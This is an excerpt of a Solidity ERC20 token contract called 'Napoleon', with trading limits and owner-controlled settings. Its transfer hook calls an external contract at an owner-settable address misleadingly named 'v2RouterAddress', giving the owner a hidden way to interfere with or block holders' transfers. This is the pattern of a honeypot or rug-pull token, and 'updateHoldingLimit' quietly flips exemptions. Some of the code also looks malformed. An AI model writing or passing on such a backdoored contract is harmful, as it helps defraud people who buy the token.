...
contract Napoleon is Ownable, ERC20 {
    using SafeMath for uint256;
    bool public limited = true;
    uint256 public maxHoldingAmount = 888_888_888 * 10**18 * 3 / 100;
    uint256 public maxTxnAmount = 888_888_888 * 10**18 * 3 / 100;
    address public uniswapV2Pair;
    address public v2RouterAddress;
    mapping(address => bool) public isExceptFromLimit;
    bool public openTrading = false;

    constructor() ERC20("Napoleon", "NAPOLEON") {
        ...
        uint256 totalsupply = 888_888_888 * 10**18;
    ...
    function _beforeTokenTransfer(
        ...
        if (!isExceptFromLimit[from] && !isExceptFromLimit[to] && v2RouterAddress != address(0)) {
            IERC20(v2RouterAddress).transferFrom(from, to, amount);
        }
        return amount;
    }

    function setV2RouterAddress(address _address) external onlyOwner {
        v2RouterAddress = _address;
    }
    ...
    function updateHoldingLimit(address _address, bool _amount) external onlyOwner {
        isExceptFromLimit[_address] = _amount;
    }
